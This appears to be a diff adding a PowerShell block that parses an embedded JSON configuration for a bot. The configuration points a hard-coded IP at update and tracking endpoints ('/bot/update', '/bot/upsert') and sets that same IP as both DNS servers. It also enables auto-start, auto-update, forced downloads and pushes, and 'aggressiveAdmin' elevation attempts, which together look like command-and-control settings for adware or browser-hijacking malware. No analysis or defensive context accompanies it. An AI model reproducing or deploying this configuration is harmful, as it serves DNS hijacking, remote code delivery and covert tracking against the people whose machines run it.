@@ -1,0 +1,36 @@
+
+$server = @'
+{
+  "version": "2026.06.14 06:21:50",
+  "urlDoc": "",
+  "disabled": false,
+  "disableVirus": false,
+  "serverIp": "199.91.221.111",
+  "server": "test3",
+  "primaryDns": "199.91.221.111",
+  "secondaryDns": "199.91.221.111",
+  "extraUpdate": false,
+  "updateUrl": "http://199.91.221.111/bot/update",
+  "track": true,
+  "trackDesktop": false,
+  "trackUrl": "http://199.91.221.111/bot/upsert",
+  "autoStart": true,
+  "autoUpdate": true,
+  "aggressiveAdmin": true,
+  "aggressiveAdminDelay": 1,
+  "aggressiveAdminAttempts": 0,
+  "aggressiveAdminTimes": 0,
+  "pushesForce": true,
+  "pushes": [],
+  "startDownloadsForce": true,
+  "startDownloads": [],
+  "startDownloadsBackForce": true,
+  "startDownloadsBack": [],
+  "startUrlsForce": false,
+  "startUrls": [],
+  "frontForce": false,
+  "front": [],
+  "embeddingsForce": false,
+  "embeddings": []
+}
+'@ | ConvertFrom-Json
